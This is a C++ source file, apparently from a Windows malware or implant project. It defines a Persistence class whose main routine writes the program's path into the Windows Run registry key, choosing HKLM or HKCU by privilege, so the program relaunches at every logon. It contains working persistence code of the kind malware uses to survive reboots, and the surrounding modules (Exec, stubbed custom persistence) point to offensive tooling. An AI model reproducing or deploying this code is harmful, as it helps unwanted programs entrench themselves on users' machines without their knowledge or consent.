#include "../inc/Persistence.h"
#include "../inc/other.h"
#include "../inc/common.h"
#include "../inc/Exec.h"

using namespace std;

Persistence::Persistence(bool admin, wstring path_prog)
{
    a_is_admin = admin;
    a_path_prog = path_prog;
}

INT Persistence::customPersi()
{
    //Fonction à venir.
    return 0;
}

VOID Persistence::main() 
{
    /*
    This function sets the persistence of the program by adding a registry key to the Run key.
    */

    WCHAR value[] = L"" NAME_KEY_REGISTER; //The name of the registry key to be created.
    HKEY hKey, HKEY_admin_or_not; //Handle to the key.
    
    LONG status; //The status of the function.
    DWORD error = false; //If an error occurs or not.
    
    WCHAR path_of_key[MAX_PATH]; //The path of the registry key.

    //Initialization of variables according to privileges. 
    if (a_is_admin) //If the user is an admin, set HKEY_LOCAL_MACHINE, otherwise set HKCU.
    {
        //If user is an admin.
        HKEY_admin_or_not = HKEY_LOCAL_MACHINE;
        wcscpy(path_of_key, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run");
    }
    else
    {
        //If user is not an admin.
        HKEY_admin_or_not = HKEY_CURRENT_USER;
        wcscpy(path_of_key, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run");
    }

    //Open the registry key.
    if (RegOpenKeyExW(HKEY_admin_or_not, path_of_key, 0, KEY_ALL_ACCESS, &hKey) == 0) //https://stackoverflow.com/questions/820846/regopenkeyex-fails-on-hkey-local-machine
    {
        //Create the registry key.
        status = RegSetValueExW(hKey, value, 0, REG_SZ, (LPBYTE)a_path_prog.c_str(), a_path_prog.size() * sizeof(WCHAR));

        //Check if there is an error.
        if (status != 0)
        {
            error = true;
        }

        //Close the registry key.
        RegCloseKey(hKey);   
    }
    else
    {
        error = true;
    }

    //If there is an error.
    if (error)
    {
        //defaultPersi(); TO CHANGE
    }    
}

/*
Inspired by:
- https://stackoverflow.com/questions/6308426/reggetvalue-questions
- http://www.cplusplus.com/forum/general/50264/
- https://docs.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights

Note: Unlike the RegCreateKeyEx function, the RegOpenKeyEx function does not create the specified key if the key does not exist in the registry.
*/
